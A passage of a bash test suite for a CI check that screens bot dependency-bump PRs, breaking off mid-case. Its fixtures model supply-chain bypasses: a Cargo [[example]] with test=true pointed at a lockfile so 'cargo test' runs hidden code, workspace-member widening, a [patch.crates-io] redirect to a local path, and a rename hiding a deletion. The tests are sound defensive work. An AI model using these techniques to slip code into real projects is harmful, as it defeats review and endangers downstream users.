# ROUND FOUR. Cases 22 to 35 close two things the third round's review found:
# vector 4 plus the two doors found alongside it, and the fact that the
# self-test did not actually kill several of the mutations it was written to
# catch (13 of 24 in the reviewer's own battery, including reverting
# `--no-renames` and three of the five old capability keys). Case 22 is the
# reviewer's own R080 construction, reproduced exactly because it is the
# minimal case that isolates `--no-renames` as the SOLE cause of a refusal;
# cases 18 and 17 above do not (case 18's destination pre-existed on base, so
# git reports no rename at all regardless of the flag; case 17 is refused by
# the manifest check with the flag ablated too, a second sufficient reason
# for the same verdict that cannot distinguish it).
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 22. The R080 case where `--no-renames` is the ONLY thing that can produce a
#     refusal: non-bot path, no Cargo.toml anywhere in the diff (so the
#     manifest check is not a second, independent reason to refuse), and the
#     rename's DESTINATION is genuinely new at HEAD, not a file that already
#     existed on base (unlike case 18, where git pairs the deletion with an
#     unrelated pre-existing file and never reports a rename to begin with).
#     Rewriting ~20 percent of the file keeps git's rename detector at R080
#     rather than R100, matching what an attacker gets from rewriting a
#     renamed file's content rather than leaving it byte-identical.
# ---------------------------------------------------------------------------
D22="$WORK/r080-rename-sole-cause"
new_repo "$D22"
mkdir -p "$D22/crates/pol/src"
{
  printf 'pub fn secret_key() -> &str { "hunter2" }\n'
  for i in $(seq 1 40); do printf '// filler %s\n' "$i"; done
} > "$D22/crates/pol/src/undeclared_secret.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D22/crates/pol/Cargo.toml"
commit_all "$D22" base
git -C "$D22" checkout -qb pr
git -C "$D22" mv crates/pol/src/undeclared_secret.rs crates/pol/src/declared_new.rs
{
  printf 'pub fn renamed() -> u8 { 1 }\n'
  printf '// NEW LINE A\n// NEW LINE B\n// NEW LINE C\n// NEW LINE D\n// NEW LINE E\n'
  for i in $(seq 1 35); do printf '// filler %s\n' "$i"; done
} > "$D22/crates/pol/src/declared_new.rs"
commit_all "$D22" implement
SIM22="$(git -C "$D22" diff --name-status main HEAD | head -1)"
note "git's own rename detection on this pair: $SIM22"
case "$SIM22" in
  R0[0-9][0-9]*) : ;;
  *) echo "FAIL: case 22's fixture no longer produces a partial (R0xx) rename; the case needs rebuilding, not the script." >&2; FAILED=1 ;;
esac
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/src/declared_new.rs` | create | the new module |
'
echo "== R080 rename, --no-renames is the SOLE cause of the refusal (no Cargo.toml in this diff) =="
OUT22="$(run_scope "$D22")" && RC22=0 || RC22=$?
if [ "$RC22" -eq 0 ]; then
  echo "FAIL: case 22 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT22" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT22" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a rename that hides an undeclared source-file deletion, with no manifest in the diff at all, was reported as matching. Got:"
  echo "$OUT22" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT22" | grep -qF 'undeclared_secret.rs'; then
  echo "FAIL: refused, but the deleted file was not named. Got:"
  echo "$OUT22" | sed 's/^/    /'
  FAILED=1
else
  note "refused, and the deleted file is named, with no other reason available to explain it"
fi

# ---------------------------------------------------------------------------
# 23. VECTOR 4 (PR 837's third review round): a crate manifest gains an
#     `[[example]]` target, `test = true`, pointed at the crate's own fuzz
#     lockfile, which stays content-unconstrained and allowlisted. `cargo
#     test` builds AND RUNS a `test = true` example. This must be refused,
#     naming the new `example` entry, even though every file in the diff is
#     individually a literal, allowlisted path.
# ---------------------------------------------------------------------------
D23="$WORK/vector4-example-test-true"
new_repo "$D23"
mkdir -p "$D23/crates/pol/src" "$D23/crates/pol/fuzz"
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\nexclude=["crates/pol/fuzz"]\n' > "$D23/Cargo.toml"
printf 'pub fn x(){}\n' > "$D23/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[dependencies]\n' > "$D23/crates/pol/Cargo.toml"
printf '# placeholder fuzz lockfile\n' > "$D23/crates/pol/fuzz/Cargo.lock"
commit_all "$D23" base
git -C "$D23" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[dependencies]\n\n[[example]]\nname="compat"\npath="fuzz/Cargo.lock"\ntest=true\n' > "$D23/crates/pol/Cargo.toml"
printf 'fn main(){}\n#[test]\nfn compat(){ /* arbitrary code under cargo test */ }\n' > "$D23/crates/pol/fuzz/Cargo.lock"
commit_all "$D23" "chore(deps): bump libfuzzer-sys from 0.4.7 to 0.4.8"
fake_gh 'dependabot[bot]' ''
echo "== VECTOR 4: [[example]] test=true pointed at the fuzz lockfile must be refused =="
OUT23="$(run_scope "$D23")" && RC23=0 || RC23=$?
if [ "$RC23" -eq 0 ]; then
  echo "FAIL: case 23 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT23" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT23" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: vector 4 ([[example]] test=true) was reported EXEMPT. Got:"
  echo "$OUT23" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT23" | grep -qF 'example'; then
  echo "FAIL: vector 4 was refused, but the new [[example]] entry was not named. Got:"
  echo "$OUT23" | sed 's/^/    /'
  FAILED=1
else
  note "vector 4 is refused, and the new [[example]] entry is named"
fi

# ---------------------------------------------------------------------------
# 24. DOOR 2 (found alongside vector 4): `[[example]]` inside a FUZZ crate's
#     OWN manifest, plus the root `[workspace] members` widened to reach it,
#     with the fuzz crate's `[workspace]` table removed so it can be pulled
#     into the ancestor workspace. Neither the fuzz manifest nor the root
#     manifest carries any of the five keys the old capability check named,
#     and the root manifest cannot carry most of them at all (a virtual
#     manifest has no `[package]`), which is exactly why the old check never
#     looked at it. Both files must be refused.
# ---------------------------------------------------------------------------
D24="$WORK/door2-fuzz-example-plus-root-members"
new_repo "$D24"
mkdir -p "$D24/crates/pol/src" "$D24/crates/pol/fuzz/fuzz_targets"
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\nexclude=["crates/pol/fuzz"]\n' > "$D24/Cargo.toml"
printf 'pub fn x(){}\n' > "$D24/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n' > "$D24/crates/pol/Cargo.toml"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\ntest=false\n' > "$D24/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D24/crates/pol/fuzz/fuzz_targets/t.rs"
printf '# placeholder\n' > "$D24/crates/pol/fuzz/Cargo.lock"
commit_all "$D24" base
git -C "$D24" checkout -qb pr
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\ntest=false\n\n[[example]]\nname="compat"\npath="Cargo.lock"\ntest=true\n' > "$D24/crates/pol/fuzz/Cargo.toml"
printf '[workspace]\nresolver="2"\nmembers=["crates/pol", "crates/pol/fuzz"]\n' > "$D24/Cargo.toml"
printf 'fn main(){}\n#[test]\nfn compat(){ /* arbitrary code */ }\n' > "$D24/crates/pol/fuzz/Cargo.lock"
commit_all "$D24" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== DOOR 2: fuzz-manifest [[example]] plus root [workspace] members widening must be refused =="
OUT24="$(run_scope "$D24")" && RC24=0 || RC24=$?
if [ "$RC24" -eq 0 ]; then
  echo "FAIL: case 24 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT24" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT24" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: door 2 was reported EXEMPT. Got:"
  echo "$OUT24" | sed 's/^/    /'
  FAILED=1
else
  note "door 2 is refused"
fi

# ---------------------------------------------------------------------------
# 25. DOOR 3 (found alongside vector 4): the ROOT manifest's `[patch.crates-io]`
#     table, never inspected by the five-key capability check at all (none of
#     `package.build`, `[lib] path`, `[[bin]]`/`[[test]]`/`[[bench]] path` are
#     even legal in a virtual workspace manifest, so the old check had no
#     reason to look at `Cargo.toml` beyond the crate level). Redirecting a
#     real dependency to a local path is exactly the kind of retargeting a
#     dependency bump never needs.
# ---------------------------------------------------------------------------
D25="$WORK/door3-root-patch-crates-io"
new_repo "$D25"
mkdir -p "$D25/crates/pol/src" "$D25/crates/pol/fuzz"
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\nexclude=["crates/pol/fuzz"]\n' > "$D25/Cargo.toml"
printf 'pub fn x(){}\n' > "$D25/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D25/crates/pol/Cargo.toml"
printf 'fn main(){}\n' > "$D25/crates/pol/fuzz/evil.rs"
commit_all "$D25" base
git -C "$D25" checkout -qb pr
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\nexclude=["crates/pol/fuzz"]\n\n[patch.crates-io]\nlibc = { path = "crates/pol/fuzz" }\n' > "$D25/Cargo.toml"
commit_all "$D25" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== DOOR 3: root [patch.crates-io] path must be refused =="
OUT25="$(run_scope "$D25")" && RC25=0 || RC25=$?
if [ "$RC25" -eq 0 ]; then
  echo "FAIL: case 25 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT25" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT25" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: door 3 (root [patch.crates-io]) was reported EXEMPT. Got:"
  echo "$OUT25" | sed 's/^/    /'
  FAILED=1
else
  note "door 3 is refused"
fi

# ---------------------------------------------------------------------------
# 26. A dependency table gaining a BRAND NEW entry, with the existing entry's
#     version untouched, must be refused: a real bump moves a version string
#     on a dependency that was ALREADY declared, it does not add one. This is
#     the allowlist's own boundary, not a container-chasing fix; if this were
#     exempt a bot PR could smuggle an entirely new dependency into the tree
#     under the label "bump".
# ---------------------------------------------------------------------------
D26="$WORK/new-dependency-key-introduced"
new_repo "$D26"
mkdir -p "$D26/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D26/crates/pol/Cargo.toml"
commit_all "$D26" base
git -C "$D26" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\nnewcrate = "1.0"\n' > "$D26/crates/pol/Cargo.toml"
commit_all "$D26" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a brand-new dependency key, with the existing one untouched, must be refused =="
OUT26="$(run_scope "$D26")" && RC26=0 || RC26=$?
if [ "$RC26" -eq 0 ]; then
  echo "FAIL: case 26 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT26" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT26" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: introducing a brand-new dependency was reported EXEMPT. Got:"
  echo "$OUT26" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT26" | grep -qF 'newcrate'; then
  echo "FAIL: refused, but the new dependency was not named. Got:"
  echo "$OUT26" | sed 's/^/    /'
  FAILED=1
else
  note "a brand-new dependency key is refused and named"
fi

# ---------------------------------------------------------------------------
# 27. A dependency entry REMOVED entirely must be refused too: a bump never
#     deletes a dependency, and silently dropping one changes what the crate
#     compiles against just as much as adding one does.
# ---------------------------------------------------------------------------
D27="$WORK/dependency-key-removed"
new_repo "$D27"
mkdir -p "$D27/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\noldcrate = "1.0"\n' > "$D27/crates/pol/Cargo.toml"
commit_all "$D27" base
git -C "$D27" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D27/crates/pol/Cargo.toml"
commit_all "$D27" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a removed dependency entry must be refused =="
OUT27="$(run_scope "$D27")" && RC27=0 || RC27=$?
if [ "$RC27" -eq 0 ]; then
  echo "FAIL: case 27 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT27" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT27" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: removing a dependency entry was reported EXEMPT. Got:"
  echo "$OUT27" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT27" | grep -qF 'oldcrate'; then
  echo "FAIL: refused, but the removed dependency was not named. Got:"
  echo "$OUT27" | sed 's/^/    /'
  FAILED=1
else
  note "a removed dependency entry is refused and named"
fi

# ---------------------------------------------------------------------------
# 28. `package.build` REMOVED at head must be refused (round three's NOTE:
#     the old check only ever iterated HEAD's keys, so a key present at base
#     and deleted at head was never reported; removing `build =` re-enables
#     Cargo's `build.rs` autodetection, a real behaviour change). The new
#     diff walks the UNION of base and head keys, so this is no longer a
#     silent gap.
# ---------------------------------------------------------------------------
D28="$WORK/package-build-removed"
new_repo "$D28"
mkdir -p "$D28/crates/pol"
printf 'fn main(){ println!("legit"); }\n' > "$D28/crates/pol/build.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nbuild="build.rs"\n' > "$D28/crates/pol/Cargo.toml"
commit_all "$D28" base
git -C "$D28" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D28/crates/pol/Cargo.toml"
commit_all "$D28" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== package.build REMOVED at head must be refused, not silently ignored =="
OUT28="$(run_scope "$D28")" && RC28=0 || RC28=$?
if [ "$RC28" -eq 0 ]; then
  echo "FAIL: case 28 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT28" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT28" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: removing package.build was reported EXEMPT. Got:"
  echo "$OUT28" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT28" | grep -qF 'package.build'; then
  echo "FAIL: refused, but package.build was not named as the reason. Got:"
  echo "$OUT28" | sed 's/^/    /'
  FAILED=1
else
  note "package.build being removed is refused and named"
fi

# ---------------------------------------------------------------------------
# 29. A detailed-table dependency entry that changes a NON-version sub-key
#     (here, `features`) alongside its version must be refused and the
#     `features` sub-key named: only `version` is allowed to move.
# ---------------------------------------------------------------------------
D29="$WORK/dependency-table-nonversion-subkey-changed"
new_repo "$D29"
mkdir -p "$D29/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.0", features = ["derive"] }\n' > "$D29/crates/pol/Cargo.toml"
commit_all "$D29" base
git -C "$D29" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.1", features = ["derive", "rc"] }\n' > "$D29/crates/pol/Cargo.toml"
commit_all "$D29" "chore(deps): bump serde and quietly add a feature"
fake_gh 'dependabot[bot]' ''
echo "== a dependency's non-version sub-key (features) changing alongside its version must be refused =="
OUT29="$(run_scope "$D29")" && RC29=0 || RC29=$?
if [ "$RC29" -eq 0 ]; then
  echo "FAIL: case 29 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT29" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT29" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a features change riding along with a version bump was reported EXEMPT. Got:"
  echo "$OUT29" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT29" | grep -qF 'features'; then
  echo "FAIL: refused, but the features sub-key was not named. Got:"
  echo "$OUT29" | sed 's/^/    /'
  FAILED=1
else
  note "the features sub-key change is refused and named, even though version also moved"
fi

# ---------------------------------------------------------------------------
# 30. POSITIVE CONTROL for 29: the same detailed-table shape, but ONLY
#     `version` changes and every other sub-key is byte-identical, must stay
#     EXEMPT. Without this, case 29 could be satisfied by a check that
#     refuses every detailed-table dependency outright, which would refuse
#     real bumps of the shape this repository actually has (workspace
#     dependencies with `features`/`default-features` alongside `version`).
# ---------------------------------------------------------------------------
D30="$WORK/dependency-table-version-only-change"
new_repo "$D30"
mkdir -p "$D30/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.0", features = ["derive"] }\n' > "$D30/crates/pol/Cargo.toml"
commit_all "$D30" base
git -C "$D30" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.1", features = ["derive"] }\n' > "$D30/crates/pol/Cargo.toml"
commit_all "$D30" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
echo "== a detailed-table dependency whose ONLY sub-key change is version must stay EXEMPT =="
OUT30="$(run_scope "$D30")" && RC30=0 || RC30=$?
if [ "$RC30" -ne 0 ]; then
  echo "FAIL: case 30 was expected to pass (rc=0) but exited non-zero (rc=$RC30)." >&2
  echo "$OUT30" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT30" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "a version-only change inside a detailed dependency table stays EXEMPT"
else
  echo "FAIL: a detailed-table dependency's version-only change was refused. Got:"
  echo "$OUT30" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 31. POSITIVE CONTROL: `[workspace.dependencies]` on the ROOT manifest, a
#     plain string version bump, must stay EXEMPT. This is the exact shape of
#     this repository's own real Dependabot PRs #831, #833 and #834.
# ---------------------------------------------------------------------------
D31="$WORK/workspace-dependencies-string-bump"
new_repo "$D31"
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\n\n[workspace.dependencies]\nserde = "1.0"\n' > "$D31/Cargo.toml"
mkdir -p "$D31/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D31/crates/pol/Cargo.toml"
commit_all "$D31" base
git -C "$D31" checkout -qb pr
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\n\n[workspace.dependencies]\nserde = "1.1"\n' > "$D31/Cargo.toml"
commit_all "$D31" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
echo "== workspace.dependencies string bump on the root manifest must stay EXEMPT (real PRs #831/#833/#834 shape) =="
OUT31="$(run_scope "$D31")" && RC31=0 || RC31=$?
if [ "$RC31" -ne 0 ]; then
  echo "FAIL: case 31 was expected to pass (rc=0) but exited non-zero (rc=$RC31)." >&2
  echo "$OUT31" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT31" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "a workspace.dependencies string bump stays EXEMPT"
else
  echo "FAIL: a workspace.dependencies string bump was refused. Got:"
  echo "$OUT31" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 32. POSITIVE CONTROL: a `[target.'cfg(unix)'.dependencies]` string bump
#     must stay EXEMPT too. The allowlist names this table explicitly; this
#     proves the code path, not just the comment.
# ---------------------------------------------------------------------------
D32="$WORK/target-cfg-dependencies-string-bump"
new_repo "$D32"
mkdir -p "$D32/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[target.\x27cfg(unix)\x27.dependencies]\nlibc = "0.2"\n' > "$D32/crates/pol/Cargo.toml"
commit_all "$D32" base
git -C "$D32" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[target.\x27cfg(unix)\x27.dependencies]\nlibc = "0.3"\n' > "$D32/crates/pol/Cargo.toml"
commit_all "$D32" "chore(deps): bump libc"
fake_gh 'dependabot[bot]' ''
echo "== a target.'cfg(unix)'.dependencies string bump must stay EXEMPT =="
OUT32="$(run_scope "$D32")" && RC32=0 || RC32=$?
if [ "$RC32" -ne 0 ]; then
  echo "FAIL: case 32 was expected to pass (rc=0) but exited non-zero (rc=$RC32)." >&2
  echo "$OUT32" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT32" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "a target-specific dependencies string bump stays EXEMPT"
else
  echo "FAIL: a target.'cfg(unix)'.dependencies string bump was refused. Got:"
  echo "$OUT32" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 33. FAIL CLOSED: a HEAD manifest that does not parse as TOML at all must be
#     refused, naming that it could not be verified, never silently treated
#     as introducing nothing.
# ---------------------------------------------------------------------------
D33="$WORK/head-manifest-unparsable"
new_repo "$D33"
mkdir -p "$D33/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D33/crates/pol/Cargo.toml"
commit_all "$D33" base
git -C "$D33" checkout -qb pr
printf '[package\nname="pol"\nversion="0.1.0"\n' > "$D33/crates/pol/Cargo.toml"
commit_all "$D33" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a HEAD manifest that fails to parse as TOML must be refused =="
OUT33="$(run_scope "$D33")" && RC33=0 || RC33=$?
if [ "$RC33" -eq 0 ]; then
  echo "FAIL: case 33 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT33" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT33" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an unparsable HEAD manifest was reported EXEMPT. Got:"
  echo "$OUT33" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT33" | grep -qiF 'does not parse as toml'; then
  echo "FAIL: refused, but not for the unparsable-TOML reason. Got:"
  echo "$OUT33" | sed 's/^/    /'
  FAILED=1
else
  note "an unparsable HEAD manifest is refused, naming that it could not be verified"
fi

# ---------------------------------------------------------------------------
# 34. FAIL CLOSED: a BASE manifest that exists but does not parse as TOML
#     (some earlier, already-merged commit is malformed) must also be
#     refused, even when HEAD's version looks like an innocuous bump: there
#     is nothing valid to diff the bump against, so safety cannot be verified.
# ---------------------------------------------------------------------------
D34="$WORK/base-manifest-unparsable"
new_repo "$D34"
mkdir -p "$D34/crates/pol"
printf '[package\nname="pol"\nversion="0.1.0"\n' > "$D34/crates/pol/Cargo.toml"
commit_all "$D34" base
git -C "$D34" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D34/crates/pol/Cargo.toml"
commit_all "$D34" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a BASE manifest that does not parse as TOML must be refused, even if HEAD looks like a clean bump =="
OUT34="$(run_scope "$D34")" && RC34=0 || RC34=$?
if [ "$RC34" -eq 0 ]; then
  echo "FAIL: case 34 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT34" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT34" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an unparsable BASE manifest was reported EXEMPT. Got:"
  echo "$OUT34" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT34" | grep -qiF 'base version exists but does not parse as toml'; then
  echo "FAIL: refused, but not for the unparsable-BASE reason. Got:"
  echo "$OUT34" | sed 's/^/    /'
  FAILED=1
else
  note "an unparsable BASE manifest is refused, naming that it could not be verified"
fi

# ---------------------------------------------------------------------------
# 35. FAIL CLOSED: the base blob exists (`git cat-file -e` succeeds) but
#     cannot be READ (`git show` fails), the one fail-closed branch round
#     three's own battery found untested (N9: "fail-OPEN when the base blob
#     cannot be read" survived GREEN). A real corrupted object is awkward to
#     construct on purpose, so this narrows `git` itself for exactly one call
#     via a stub ahead of the real binary on PATH, the same technique already
#     used for `gh`: intercept only `show <BASE>:crates/pol/Cargo.toml` and
#     fail it, delegate every other invocation (merge-base, diff, cat-file,
#     every other show) to the real git so nothing else in the script's
#     behaviour is disturbed.
# ---------------------------------------------------------------------------
D35="$WORK/base-blob-unreadable"
new_repo "$D35"
mkdir -p "$D35/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D35/crates/pol/Cargo.toml"
commit_all "$D35" base
BASE35="$(git -C "$D35" rev-parse main)"
git -C "$D35" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D35/crates/pol/Cargo.toml"
commit_all "$D35" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
cat > "$FAKEBIN/git" <<GITWRAP
#!/usr/bin/env bash
if [ "\$1" = "show" ] && [ "\$2" = "$BASE35:crates/pol/Cargo.toml" ]; then
  echo "fake git: simulated unreadable blob" >&2
  exit 1
fi
exec "$REAL_GIT" "\$@"
GITWRAP
chmod +x "$FAKEBIN/git"
echo "== a base blob that exists but cannot be read must be refused, naming the failure, not treated as safe =="
OUT35="$(run_scope "$D35")" && RC35=0 || RC35=$?
if [ "$RC35" -eq 0 ]; then
  echo "FAIL: case 35 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT35" | sed 's/^/    /' >&2
  FAILED=1
fi
rm -f "$FAKEBIN/git"
if echo "$OUT35" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an unreadable base blob was reported EXEMPT. Got:"
  echo "$OUT35" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT35" | grep -qiF 'could not read the base'; then
  echo "FAIL: refused, but not for the unreadable-base-blob reason. Got:"
  echo "$OUT35" | sed 's/^/    /'
  FAILED=1
else
  note "an unreadable base blob is refused, naming the read failure"
fi

# ---------------------------------------------------------------------------
# 36. POSITIVE CONTROL: `[dev-dependencies]` and `[build-dependencies]` string
#     bumps must ALSO stay EXEMPT, not just `[dependencies]`. Without a case
#     naming these two tables specifically, dropping either from the
#     allowlist's internal `DEP_TABLE_NAMES` tuple is invisible: it only makes
#     the check MORE restrictive (a real bump to either table would start
#     being wrongly refused), so nothing else here would catch it.
# ---------------------------------------------------------------------------
D36="$WORK/dev-and-build-dependencies-string-bump"
new_repo "$D36"
mkdir -p "$D36/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dev-dependencies]\ncriterion = "0.5"\n\n[build-dependencies]\ncc = "1.0"\n' > "$D36/crates/pol/Cargo.toml"
commit_all "$D36" base
git -C "$D36" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dev-dependencies]\ncriterion = "0.6"\n\n[build-dependencies]\ncc = "1.1"\n' > "$D36/crates/pol/Cargo.toml"
commit_all "$D36" "chore(deps): bump criterion and cc"
fake_gh 'dependabot[bot]' ''
echo "== dev-dependencies AND build-dependencies string bumps together must stay EXEMPT =="
OUT36="$(run_scope "$D36")" && RC36=0 || RC36=$?
if [ "$RC36" -ne 0 ]; then
  echo "FAIL: case 36 was expected to pass (rc=0) but exited non-zero (rc=$RC36)." >&2
  echo "$OUT36" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT36" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "dev-dependencies and build-dependencies string bumps stay EXEMPT"
else
  echo "FAIL: a dev-dependencies/build-dependencies string bump was refused. Got:"
  echo "$OUT36" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 36b. POSITIVE CONTROL, the target-specific variants of case 36: a
#      `[target.'cfg(unix)'.dev-dependencies]` string bump must ALSO stay
#      EXEMPT. `is_dep_table_path`'s target-cfg branch tests membership in
#      the SAME `DEP_TABLE_NAMES` tuple case 32 already exercises for the
#      plain `.dependencies` variant; without this case, narrowing that tuple
#      to drop `dev-dependencies`/`build-dependencies` only breaks the
#      target-cfg form (the top-level `[dev-dependencies]` table is matched
#      by a separate, hardcoded tuple entry case 36 covers) and nothing here
#      would notice.
# ---------------------------------------------------------------------------
D36b="$WORK/target-cfg-dev-dependencies-string-bump"
new_repo "$D36b"
mkdir -p "$D36b/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[target.\x27cfg(unix)\x27.dev-dependencies]\nassert_cmd = "2.0"\n' > "$D36b/crates/pol/Cargo.toml"
commit_all "$D36b" base
git -C "$D36b" checkout -qb pr
